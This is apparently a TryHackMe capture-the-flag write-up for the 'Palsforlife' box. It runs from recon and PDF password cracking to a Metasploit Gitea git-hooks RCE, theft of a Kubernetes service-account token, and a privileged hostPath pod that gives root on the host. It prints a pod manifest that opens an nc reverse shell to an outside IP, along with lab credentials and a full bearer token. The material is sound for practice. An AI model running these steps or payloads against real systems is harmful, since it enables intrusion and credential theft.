# Palsforlife Tryhackme Writeup

Medium level box in thm.

> Arunkumar (0xarun)

-----------------------------

#### Nmap

```bash
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2022-01-07 19:53 IST
Warning: 10.10.12.106 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.12.106
Host is up (0.22s latency).
Not shown: 45668 filtered ports, 19863 closed ports
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
10250/tcp open  ssl/http Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
30180/tcp open  unknown
31111/tcp open  unknown
31112/tcp open  ssh      OpenSSH 7.5 (protocol 2.0)
1 service unrecognized despite returning data.
```
31111 - Gitea

30180 - Ngnix

Gitea version: 38d8b8c

Go1.10.4

add hosts file team.thm

```bash
┌──(arundhanush㉿kali)-[~/CTF/THM/palsforlife/10.10.178.163]
└─$ dirsearch -u http://10.10.178.163:30180/ -w /opt/Seclists/Discovery/Web-Content/common.txt 

  _|. _ _  _  _  _ _|_    v0.4.1
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 4658

Output File: /home/arundhanush/.dirsearch/reports/10.10.178.163/_22-01-08_20-35-19.txt

Error Log: /home/arundhanush/.dirsearch/logs/errors-22-01-08_20-35-19.log

Target: http://10.10.178.163:30180/
                                                                                                                                                                      
[20:35:20] Starting: 
[20:36:42] 301 -  169B  - /team  ->  http://10.10.178.163/team/                               
                                                       
Task Completed 
```

http://10.10.178.163:30180/team 

```html
   <!-- I shouldn't forget this -->
      <div id="uninteresting_file.pdf" style="visibility: hidden; display: none;">JVBERi0xLjcKJb/3ov4KMSAwIG9iago8PCAvRGVzdHMgMyAwIFIgL0V4dGVuc2lvbnMgPDwgL0FE
QkUgPDwgL0Jhc2VWZXJzaW9uIC8xLjcgL0V4dGVuc2lvbkxldmVsIDggPj4gPj4gL1BhZ2VzIDQg
MCBSIC9UeXBlIC9DYXRhbG9nID4+CmVuZG9iagoyIDAgb2JqCjw8IC9DcmVhdGlvbkRhdGUgPDEw
Y2ZlYThkZWMyYTBjOGMzOGQ1ZTYwMzBlYzQxOTQ5NGZiMGU2OWQ5MzViZDNkNjc5ODNiZTAxNWY4
MzdiYjJjNThjYmQzYzQ5OGRkOWZmYzE0OTMwNzZiNTY4YjE1Nz4gL0NyZWF0b3IgPGI3ZDRmNjA3
NTljZDRlOWM3MjU0Nzc5ZjgxZWQ3ZGU5ODdkNjVmOWVhODAzNDVjYjllNTkyNWUxOTllZTk5Njkw
MGUzYjkzYjAzNjQ2MzM3MTNjMzRlYmZlYjgzMGQ3ZWEzYWE0ZDhmOTUyYTJiOWU2OTI0ZmMzZmNi
MzNjM2EyMjU3NmQ5MGI3NjBkNzE5NzExY2U5OGQ2ZDhlYzI3NmM5ZGUwYjI0YTYwZDdjMTIxMjZm
YWZhZDM3MmEwOTlkMDE2NjYzNzY5NjY3ZTQ0MTQ4ODQ3NzQ1MzVkMTMxZmE1MmViYTYzOGY0ZTFl
MTNjNTBlNWFmMjJkNzYzZTJkMDM+IC9Nb2REYXRlIDxhMjlmZDI3NjY2MGJiYzVkNWIzNGQ4ZjBi
MTY5MTBkNzk3NzVhM2YxYWU5ODQyZjAzNTRkMTg0OGUzOTgyM
---------------snip-------------------------------------------
```

base64 encoded text's, After decode it was encrypted pdf file.

pdf passowrd crack

```bash
┌──(arundhanush㉿kali)-[~/CTF/THM/palsforlife]
└─$ /usr/share/john/pdf2john.pl hash.pdf >> hash
                                                                                                                                                                      
┌──(arundhanush㉿kali)-[~/CTF/THM/palsforlife]
└─$ cat hash                          
hash.pdf:$pdf$5*6*256*-4*1*16*88ad00a9681ee7aedef1a78f402d6561*48*d64d0b238fbc4121148f2b9160146b30c32782714497083a2bbad81c74fdbaf522d2fda56661ef9f20d2713857484658*48*01196fa933adcf7610161370c5d096b40da833e0786aa09f81b8f4aee1d5bbf41f34b5f6ae55b85d811c07d321961744*32*82968e9e8581965d9612aefa3a379f6f690dd61ca377e6f72f9e27ed359bceab*32*38e2bdc42b33bc60f8e90d816900777069fefffca17acbf9f1ac3975db469f24

```

```bash
┌──(arundhanush㉿kali)-[~/CTF/THM/palsforlife]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash 
Using default input encoding: UTF-8
Loaded 1 password hash (PDF [MD5 SHA2 RC4/AES 32/64])
Cost 1 (revision) is 6 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
chickenlegs      (hash.pdf)
1g 0:00:01:20 DONE (2022-01-08 21:05) 0.01242g/s 753.2p/s 753.2c/s 753.2C/s crazyk..caseylee
Use the "--show --format=PDF" options to display all of the cracked passwords reliably
Session completed

```

pdf file contains - leeroy:I_am_geniu5_P4ladin#

### Flag 1 (Web)

Login as leeroy

go to http://10.10.210.227:31111/leeroy/jenkins/settings/hooks/1

Inspect element click secret.

### Flag 2 (Gitea git hooks exploit)

```bash
Module options (exploit/multi/http/gitea_git_hooks_rce):

   Name       Current Setting       Required  Description
   ----       ---------------       --------  -----------
   PASSWORD   I_am_geniu5_P4ladin#  yes       Password to use
   Proxies                          no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     team.thm              yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      31111                 yes       The target port (TCP)
   SSL        false                 no        Negotiate SSL/TLS for outgoing connections
   SSLCert                          no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                     yes       Base path
   URIPATH                          no        The URI to use for this exploit (default is random)
   USERNAME   leeroy                yes       Username to authenticate with
   VHOST                            no        HTTP server virtual host


Payload options (linux/x64/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.9.172.114     yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   1   Linux Dropper


msf6 exploit(multi/http/gitea_git_hooks_rce) > set ForceExploit true
ForceExploit => true
msf6 exploit(multi/http/gitea_git_hooks_rce) > run

[*] Started reverse TCP handler on 10.9.172.114:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[!] This module does not support check. Target does not appear to be running Gitea. ForceExploit is enabled, proceeding with exploitation.
[*] Executing Linux Dropper for linux/x64/meterpreter/reverse_tcp
[*] Authenticate with "leeroy/I_am_geniu5_P4ladin#"
[+] Logged in
[*] Create repository "Voyatouch_Stim"
[+] Repository created
[*] Setup post-receive hook with command
[+] Git hook setup
[*] Create a dummy file on the repo to trigger the payload
[+] File created, shell incoming...
[*] Sending stage (3012548 bytes) to 10.10.34.60
[*] Command Stager progress - 100.00% done (833/833 bytes)
[*] Meterpreter session 1 opened (10.9.172.114:4444 -> 10.10.34.60:44138) at 2022-01-09 20:45:13 +0530
[*] Cleaning up
[*] Repository Voyatouch_Stim deleted.

meterpreter > shell
Process 247 created.
Channel 1 created.
ls
id
uid=1000(git) gid=1000(git) groups=1000(git),1000(git)
cd /root
ls
flag2.txt
```

here is kubernetes tokens and crt's /var/run/secrets/kubernetes.io/serviceaccount 

ca.crt
namespace
token


```
kubernetes token

eyJhbGciOiJSUzI1NiIsImtpZCI6IkNtT1RDZkpCdzVWVjR2eVE2OVl3TGlya0tVZ21oY1NrTVBuUnUwb0JUU2sifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJkZWZhdWx0Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZWNyZXQubmFtZSI6ImRlZmF1bHQtdG9rZW4tcXM2aHAiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC5uYW1lIjoiZGVmYXVsdCIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VydmljZS1hY2NvdW50LnVpZCI6IjhlYjIwMTIwLTQ1M2MtNDI3YS05ZDZiLTQyZmZlNDY3MGMzZCIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRlZmF1bHQifQ.mzW7wWtI8ch5EDMQEhCD3jY4g56CzhO1RPyHUx5bYF7ZJVKH_qdniY0watK8GoQXNeGJKp7vk2B68efG4UaWWMCiJR6vX_d7L3HxDSbHebbD2WL17AhDFXE8QDkuZ2mO_dLnKm_DBrMA2_63v5JQfXJnU-rjSD4Xq39_LVI106frHLqVkX-roHzY4fHGjYe8ys9pwuy7Wk3QCRrYfnyuuVpglKCPfaLLnUdgbVg-x7zGrK_4MB780V7TNdZ0pH0dpfTxyS7L5KeW8uKVsG0hsfBXABv-Q_BsGuvvotpdPzrsAWkBspRRsoOPq28Cfl6uOZBAx_djkHFv3vza54WS9w
```

### References

https://www.inguardians.com/attacking-and-defending-kubernetes-bust-a-kube-episode-1/

https://rioasmara.com/2021/09/18/kubernetes-yaml-for-reverse-shell-and-map-root/

https://github.com/BishopFox/badPods/tree/main/manifests/everything-allowed

```bash
Kubectl

-o yaml
-n - namespace

 kubectl --token=` cat token` --certificate-authority=/home/arundhanush/CTF/THM/palsforlife/ca.crt --server=https://10.10.34.60:6443 auth can-i --list

 kubectl --token=` cat token` --certificate-authority=/home/arundhanush/CTF/THM/palsforlife/ca.crt --server=https://10.10.34.60:6443 get pods , nodes, namespaces

 kubectl --token=` cat token` --certificate-authority=/home/arundhanush/CTF/THM/palsforlife/ca.crt --server=https://10.10.34.60:6443 get pods -o wide     
                                                                                                                                                    
 kubectl --token=` cat token` --certificate-authority=/home/arundhanush/CTF/THM/palsforlife/ca.crt --server=https://10.10.34.60:6443 exec -it nginx-7f459c6889-8slv2 /bin/bash

```

### Try to exploit
```bash
┌──(arundhanush㉿kali)-[~/CTF/THM/palsforlife]
└─$ curl -k -H 'Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6IkNtT1RDZkpCdzVWVjR2eVE2OVl3TGlya0tVZ21oY1NrTVBuUnUwb0JUU2sifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJkZWZhdWx0Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZWNyZXQubmFtZSI6ImRlZmF1bHQtdG9rZW4tcXM2aHAiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC5uYW1lIjoiZGVmYXVsdCIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VydmljZS1hY2NvdW50LnVpZCI6IjhlYjIwMTIwLTQ1M2MtNDI3YS05ZDZiLTQyZmZlNDY3MGMzZCIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRlZmF1bHQifQ.mzW7wWtI8ch5EDMQEhCD3jY4g56CzhO1RPyHUx5bYF7ZJVKH_qdniY0watK8GoQXNeGJKp7vk2B68efG4UaWWMCiJR6vX_d7L3HxDSbHebbD2WL17AhDFXE8QDkuZ2mO_dLnKm_DBrMA2_63v5JQfXJnU-rjSD4Xq39_LVI106frHLqVkX-roHzY4fHGjYe8ys9pwuy7Wk3QCRrYfnyuuVpglKCPfaLLnUdgbVg-x7zGrK_4MB780V7TNdZ0pH0dpfTxyS7L5KeW8uKVsG0hsfBXABv-Q_BsGuvvotpdPzrsAWkBspRRsoOPq28Cfl6uOZBAx_djkHFv3vza54WS9w' https://10.10.34.60:6443/api/v1/namespaces/kube-system/pods/ >> pods.out

```
```
"image": "docker.io/rancher/coredns-coredns:1.8.0",
"imageID": "docker.io/rancher/coredns-coredns@sha256:8b675d12eb9faf3121475b12db478ac2cf5129046d92137aa9067dd04f3b4e10",
"containerID": "containerd://d3396babec5c3eb8abdca3dc56a2bb5861eb9a6caf9660f3e5c9c9c360e54e41",
docker.io/gitea/gitea@sha256:34d8b322635e5f8fb6585a29d54c31eed94d72af19383744349dbc2107083587
```


```json
{
    "apiVersion": "v1",
    "kind": "Pod",
    "metadata": {
        "name": "malicious"
    },
    "spec": {
        "containers": [{
            "name": "malicious-container",
            "image": "nginx@sha256:6d75c99af15565a301e48297fa2d121e15d80ad526f8369c526324f0f7ccb750",
            "command": ["sh"],
            "args": ["-c", "nc 10.9.172.114 4444 -e /bin/sh"],
            "securityContext": {
                "privileged": true
            },
            "serviceAccountName": "default",
            "automountServiceAccountToken": true,
            "hostNetwork": true
        }],
        "volumes": [{
            "name":"noderoot",
            "hostpath":"/"
        }]
    }
}
```

## FLag 3 (geting namespaces)

```bash
┌──(arundhanush㉿kali)-[~/CTF/THM/palsforlife]
└─$ kubectl --token=` cat token` --certificate-authority=/home/arundhanush/CTF/THM/palsforlife/ca.crt --server=https://10.10.210.227:6443 get namespaces          1 ⨯
NAME              STATUS   AGE
default           Active   222d
kube-system       Active   222d
kube-public       Active   222d
kube-node-lease   Active   222d
                                                                                                                                                                      
┌──(arundhanush㉿kali)-[~/CTF/THM/palsforlife]
└─$ kubectl --token=` cat token` --certificate-authority=/home/arundhanush/CTF/THM/palsforlife/ca.crt --server=https://10.10.210.227:6443 get secrets -n kube-system
NAME                                                 TYPE                                  DATA   AGE
ttl-controller-token-kl49c                           kubernetes.io/service-account-token   3      222d
node-controller-token-mjlrr                          kubernetes.io/service-account-token   3      222d
pod-garbage-collector-token-dzflc                    kubernetes.io/service-account-token   3      222d
resourcequota-controller-token-g2pwj                 kubernetes.io/service-account-token   3      222d
statefulset-controller-token-nqqdd                   kubernetes.io/service-account-token   3      222d
certificate-controller-token-gmcw4                   kubernetes.io/service-account-token   3      222d
endpointslicemirroring-controller-token-tffdc        kubernetes.io/service-account-token   3      222d
root-ca-cert-publisher-token-cprft                   kubernetes.io/service-account-token   3      222d
coredns-token-qb5sp                                  kubernetes.io/service-account-token   3      222d
local-path-provisioner-service-account-token-tlfjs   kubernetes.io/service-account-token   3      222d
palsforlife.node-password.k3s                        Opaque                                1      222d
expand-controller-token-wrtrt                        kubernetes.io/service-account-token   3      222d
pvc-protection-controller-token-pktqr                kubernetes.io/service-account-token   3      222d
replication-controller-token-4hsp7                   kubernetes.io/service-account-token   3      222d
namespace-controller-token-zl7qg                     kubernetes.io/service-account-token   3      222d
generic-garbage-collector-token-68pxt                kubernetes.io/service-account-token   3      222d
replicaset-controller-token-4kbp7                    kubernetes.io/service-account-token   3      222d
endpointslice-controller-token-sfh7b                 kubernetes.io/service-account-token   3      222d
horizontal-pod-autoscaler-token-cc47j                kubernetes.io/service-account-token   3      222d
persistent-volume-binder-token-gcw5w                 kubernetes.io/service-account-token   3      222d
pv-protection-controller-token-2z6hc                 kubernetes.io/service-account-token   3      222d
job-controller-token-jh96z                           kubernetes.io/service-account-token   3      222d
cronjob-controller-token-76j67                       kubernetes.io/service-account-token   3      222d
clusterrole-aggregation-controller-token-d2v4m       kubernetes.io/service-account-token   3      222d
endpoint-controller-token-lkk7j                      kubernetes.io/service-account-token   3      222d
attachdetach-controller-token-7px9q                  kubernetes.io/service-account-token   3      222d
service-account-controller-token-8cjgk               kubernetes.io/service-account-token   3      222d
daemon-set-controller-token-lxjx7                    kubernetes.io/service-account-token   3      222d
deployment-controller-token-dn784                    kubernetes.io/service-account-token   3      222d
disruption-controller-token-8whb7                    kubernetes.io/service-account-token   3      222d
default-token-v7w56                                  kubernetes.io/service-account-token   3      222d
flag3                                                Opaque                                1      222d
k3s-serving                                          kubernetes.io/tls                     2      222d
                                                                                                                                                                      
┌──(arundhanush㉿kali)-[~/CTF/THM/palsforlife]
└─$ kubectl --token=` cat token` --certificate-authority=/home/arundhanush/CTF/THM/palsforlife/ca.crt --server=https://10.10.210.227:6443 get secrets flag3 -n kube-system
NAME    TYPE     DATA   AGE
flag3   Opaque   1      222d
                                                                                                                                                                      
┌──(arundhanush㉿kali)-[~/CTF/THM/palsforlife]
└─$ kubectl --token=` cat token` --certificate-authority=/home/arundhanush/CTF/THM/palsforlife/ca.crt --server=https://10.10.210.227:6443 get secrets flag3 -o yaml -n kube-system
apiVersion: v1
data:
  flag3.txt: ZmxhZ3tJdHNfbjB0X215X2ZhdWx0IX0=
kind: Secret
metadata:
  annotations:
    kubectl.kubernetes.io/last-applied-configuration: |
      {"apiVersion":"v1","kind":"Secret","metadata":{"annotations":{},"name":"flag3","namespace":"kube-system"},"stringData":{"flag3.txt":"flag{Its_n0t_my_fault!}"},"type":"Opaque"}
  creationTimestamp: "2021-05-31T22:01:30Z"
  name: flag3
  namespace: kube-system
  resourceVersion: "591"
  uid: 599c6a8b-2a93-4253-a02c-6c0a7eccdc3f
type: Opaque
                                                                                                                                                                      
┌──(arundhanush㉿kali)-[~/CTF/THM/palsforlife]
└─$ echo -n ZmxhZ3tJdHNfbjB0X215X2ZhdWx0IX0= | base64 -d
flag{Its_n0t_my_fault!}          
```

### Flag 4 (Exploiting pods)

```bash
kubectl --token=` cat token` --certificate-authority=/home/arundhanush/CTF/THM/palsforlife/ca.crt --server=https://10.10.34.60:6443 get pods -o yaml
```
```
----------snip-----
   - containerID: containerd://19c9551671303ac954aed6dde2e853046ce2d7a6198934133983ff70e4276b20
      image: docker.io/library/nginx:latest
      imageID: docker.io/library/nginx@sha256:6d75c99af15565a301e48297fa2d121e15d80ad526f8369c526324f0f7ccb750
--------snip-------
```
https://github.com/BishopFox/badPods/tree/main/manifests/everything-allowed


malicious pod yaml.

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: everything-allowed-exec-pod
  labels:
    app: pentest
spec:
  hostNetwork: true
  hostPID: true
  hostIPC: true
  containers:
  - name: everything-allowed-pod
    image: docker.io/library/nginx@sha256:6d75c99af15565a301e48297fa2d121e15d80ad526f8369c526324f0f7ccb750
    securityContext:
      privileged: true
    volumeMounts:
    - mountPath: /host
      name: noderoot
    command: [ "/bin/sh", "-c", "--" ]
    args: [ "while true; do sleep 30; done;" ]
  volumes:
  - name: noderoot
    hostPath:
      path: /
```

```bash
┌──(arundhanush㉿kali)-[~/CTF/THM/palsforlife]
└─$ kubectl --token=` cat token` --certificate-authority=/home/arundhanush/CTF/THM/palsforlife/ca.crt --server=https://10.10.210.227:6443 apply -f everything-allowed-exec-pod.yaml 
pod/everything-allowed-exec-pod created
                                                                                                                                                                      
┌──(arundhanush㉿kali)-[~/CTF/THM/palsforlife]
└─$ kubectl --token=` cat token` --certificate-authority=/home/arundhanush/CTF/THM/palsforlife/ca.crt --server=https://10.10.210.227:6443 get pods        
NAME                          READY   STATUS    RESTARTS   AGE
nginx-7f459c6889-8slv2        1/1     Running   2          222d
gitea-0                       1/1     Running   2          222d
everything-allowed-exec-pod   1/1     Running   0          16s
                                                                                                                                                                      
┌──(arundhanush㉿kali)-[~/CTF/THM/palsforlife]
└─$ kubectl --token=` cat token` --certificate-authority=/home/arundhanush/CTF/THM/palsforlife/ca.crt --server=https://10.10.210.227:6443 exec -it everything-allowed-exec-pod /bin/bash
kubectl exec [POD] [COMMAND] is DEPRECATED and will be removed in a future version. Use kubectl exec [POD] -- [COMMAND] instead.
bash-4.4# id
uid=0(root) gid=0(root) groups=1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
bash-4.4# ls
Makefile  bin       dev       home      lib       mnt       root      sbin      sys       usr
app       data      etc       host      media     proc      run       srv       tmp       var
bash-4.4# cd /host
bash-4.4# ls
bin             etc             initrd.img.old  lost+found      opt             run             srv             tmp             vmlinuz
boot            home            lib             media           proc            sbin            swapfile        usr             vmlinuz.old
dev             initrd.img      lib64           mnt             root            snap            sys             var
bash-4.4# cd /host/root
bash-4.4# ls
root.txt
bash-4.4# cat root.txt 
flag{At_least_I_have_chicKen}
bash-4.4# 

```

